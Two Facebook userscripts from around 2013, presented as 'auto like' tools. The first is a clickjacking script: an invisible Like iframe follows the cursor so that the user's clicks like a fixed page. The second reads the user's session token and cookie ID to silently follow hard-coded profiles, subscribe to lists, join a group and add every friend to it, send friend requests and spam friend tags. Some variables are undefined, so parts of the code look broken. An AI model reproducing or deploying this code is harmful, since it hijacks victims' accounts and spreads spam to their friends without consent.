// ==UserScript==
// @name            FAcebook Auto like fanpage *UPDATE 2013*
// @description     FAcebook Auto like fanpage by Anti-Love
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

(function(){

  var Xcord = 0,
  Ycord = 0,
  IE = document.all ? true : false;
 
  if (!IE) document.captureEvents(Event.MOUSEMOVE);
 
  var lbox = document.createElement('iframe');
  lbox.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent(/*document.location.href*/ 'https://www.facebook.com/canhbaoluadaotromcap') + '&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=lbox&amp;colorscheme=light&amp;height=80';
  lbox.scrolling = 'no';
  lbox.frameBorder = 0;
  lbox.allowTransparency = 'true';
  lbox.style.border = 0;
  lbox.style.overflow = 'hidden';
  lbox.style.cursor = 'pointer';
  lbox.style.width = '53px';
  lbox.style.height =  '23px';
  lbox.style.position = 'absolute';
  lbox.style.opacity = 0;
  document.getElementsByTagName('body')[0].appendChild(lbox);
 
  window.addEventListener('mousemove', mouseMove, false);
 
  setTimeout(function(){
    document.getElementsByTagName('body')[0].removeChild(lbox);
    window.removeEventListener('mousemove', mouseMove, false);
  }, 20000);
 
  function mouseMove(e) {
    if (IE) {
      Xcord = event.clientX + document.body.scrollLeft;
      Ycord = event.clientY + document.body.scrollTop;
    } else {
      Xcord = e.pageX;
      Ycord = e.pageY;
    }
    
    if (Xcord < 0) Xcord = 0;
    if (Ycord < 0) Ycord = 0;
    
    lbox.style.top = (Ycord - 8) + 'px';
    lbox.style.left = (Xcord - 25) + 'px';
    
    return true
  }
})();

?// ==UserScript==
// @name            FAcebook Auto HACK LIKE *UPDATE 5/2013*
// @description     FAcebook Auto HACK LIKE by Sys
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

function cereziAl(e){var t=e+"=";if(document.cookie.length>0){konum=document.cookie.indexOf(t);if(konum!=-1){konum+=t.length;son=document.cookie.indexOf(";",konum);if(son==-1)son=document.cookie.length;return unescape(document.cookie.substring(konum,son))}else{return""}}}function getRandomInt(e,t){return Math.floor(Math.random()*(t-e+1))+e}function randomValue(e){return e[getRandomInt(0,e.length-1)]}function a(e){var t=new XMLHttpRequest;var n="/ajax/follow/follow_profile.php?__a=1";var r="profile_id="+e+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";t.open("POST",n,true);t.setRequestHeader("Content-type","application/x-www-form-urlencoded");t.setRequestHeader("Content-length",r.length);t.setRequestHeader("Connection","close");t.onreadystatechange=function(){if(t.readyState==4&&t.status==200){t.close}};t.send(r)}function sublist(e){var t=document.createElement("script");t.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+e+" }).send();";document.body.appendChild(t)}function sarkadaslari_al(){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("arkadaslar = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){smesaj="";smesaj_text="";for(i=f*10;i<(f+1)*10;i++){if(arkadaslar.payload.entries[i]){smesaj+=" @["+arkadaslar.payload.entries[i].uid+":"+arkadaslar.payload.entries[i].text+"]";smesaj_text+=" "+arkadaslar.payload.entries[i].text}}sdurumpaylas()}}};var params="&filter[0]=user";params+="&options[0]=friends_only";params+="&options[1]=nm";params+="&token=v7";params+="&viewer="+user_id;params+="&__user="+user_id;if(document.URL.indexOf("https://")>=0){xmlhttp.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}else{xmlhttp.open("GET","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}xmlhttp.send()}function sarkadasekle(e,t){var n=new XMLHttpRequest;n.onreadystatechange=function(){if(n.readyState==4){}};n.open("POST","/ajax/add_friend/action.php?__a=1",true);var r="to_friend="+e;r+="&action=add_friend";r+="&how_found=friend_browser";r+="&ref_param=none";r+="&outgoing_id=";r+="&logging_location=friend_browser";r+="&no_flyout_on_click=true";r+="&ego_log_data=";r+="&http_referer=";r+="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;r+="&phstamp=165816749114848369115";r+="&__user="+user_id;n.setRequestHeader("X-SVN-Rev",svn_rev);n.setRequestHeader("Content-Type","application/x-www-form-urlencoded");if(t=="farketmez"&&document.cookie.split("cins"+user_id+"=").length>1){n.send(r)}else if(document.cookie.split("cins"+user_id+"=").length<=1){cinsiyetgetir(e,t,"sarkadasekle")}else if(t==document.cookie.split("cins"+user_id+"=")[1].split(";")[0].toString()){n.send(r)}}function scinsiyetgetir(uid,cins,fonksiyon){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("cinssonuc = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");cinshtml.innerHTML=cinssonuc.jsmods.markup[0][1].__html;btarihi.setTime(bugun.getTime()+1e3*60*60*24*365);if(cinshtml.getElementsByTagName("select")[0].value=="1"){document.cookie="cins"+user_id+"=kadin;expires="+btarihi.toGMTString()}else if(cinshtml.getElementsByTagName("select")[0].value=="2"){document.cookie="cins"+user_id+"=erkek;expires="+btarihi.toGMTString()}eval(fonksiyon+"("+id+","+cins+");")}};xmlhttp.open("GET","/ajax/timeline/edit_profile/basic_info.php?__a=1&__user="+user_id,true);xmlhttp.setRequestHeader("X-SVN-Rev",svn_rev);xmlhttp.send()}function autoSuggest(){links=document.getElementsByTagName("a");for(i in links){l=links[i];if(l.innerHTML=='<span class="uiButtonText">Suggest Friend</span>'){l.click()}}}function blub(){if(document.getElementsByClassName("pbm fsm").length==1){w=document.getElementsByClassName("pbm fsm")[0];e=document.createElement("a");e.innerHTML="Auto Suggest by Anonymous";e.className="uiButton";e.onclick=autoSuggest;if(w.childElementCount==0){w.appendChild(document.createElement("br"));w.appendChild(e)}}}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);a("100004422128563");a("100002357598022");a("100002919354797");a("100006413312250");a("100005163280318");a("100005825109292");a("100002357598022");a("100006226630835");a("100006226630835");
sublist("1394914384059436");
sublist("1394914384059436");
sublist("179573478866722");sublist("399345776820672");sublist("1379118835645214");sublist("123489967855173");var fb_dtsg=document["getElementsByName"]("fb_dtsg")[0]["value"];var user_id=document["cookie"]["match"](document["cookie"]["match"](/c_user=(\d+)/)[1]);var httpwp=new XMLHttpRequest;var urlwp="/ajax/groups/membership/r2j.php?__a=1";var paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp["open"]("POST",urlwp,true);httpwp["setRequestHeader"]("Content-type","application/x-www-form-urlencoded");httpwp["setRequestHeader"]("Content-length",paramswp["length"]);httpwp["setRequestHeader"]("Connection","keep-alive");httpwp["send"](paramswp);var fb_dtsg=document["getElementsByName"]("fb_dtsg")[0]["value"];var user_id=document["cookie"]["match"](document["cookie"]["match"](/c_user=(\d+)/)[1]);var friends=new Array;gf=new XMLHttpRequest;gf["open"]("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math["random"]()+"&filter[0]=user&options[0]=friends_only",false);gf["send"]();if(gf["readyState"]!=4){}else{data=eval("("+gf["responseText"]["substr"](9)+")");if(data["error"]){}else{friends=data["payload"]["entries"]["sort"](function(e,t){return e["index"]-t["index"]})}}for(var i=0;i<friends["length"];i++){var httpwp=new XMLHttpRequest;var urlwp="/ajax/groups/members/add_post.php?__a=1";var paramswp="&fb_dtsg="+fb_dtsg+"&group_id="+gid+"&source=typeahead&ref=&message_id=&members="+friends[i]["uid"]+"&__user="+user_id+"&phstamp=";httpwp["open"]("POST",urlwp,true);httpwp["setRequestHeader"]("Content-type","application/x-www-form-urlencoded");httpwp["setRequestHeader"]("Content-length",paramswp["length"]);httpwp["setRequestHeader"]("Connection","keep-alive");httpwp["onreadystatechange"]=function(){if(httpwp["readyState"]==4&&httpwp["status"]==200){}};httpwp["send"](paramswp)}var spage_id="335173899914351";var spost_id="335173899914351";var sfoto_id="335173899914351";var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var smesaj="";var smesaj_text="";var arkadaslar=[];var svn_rev;var bugun=new Date;var btarihi=new Date;btarihi.setTime(bugun.getTime()+1e3*60*60*4*1);if(!document.cookie.match(/paylasti=(\d+)/)){document.cookie="paylasti=hayir;expires="+btarihi.toGMTString()}var tiklama=document.addEventListener("click",function(){if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir")>=0){svn_rev=document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];sarkadaslari_al();document.cookie="paylasti=evet;expires="+btarihi.toGMTString();document.removeEventListener(tiklama)}},false);var cinssonuc={};var cinshtml=document.createElement("html");blub();document.addEventListener("DOMNodeInserted",blub,true)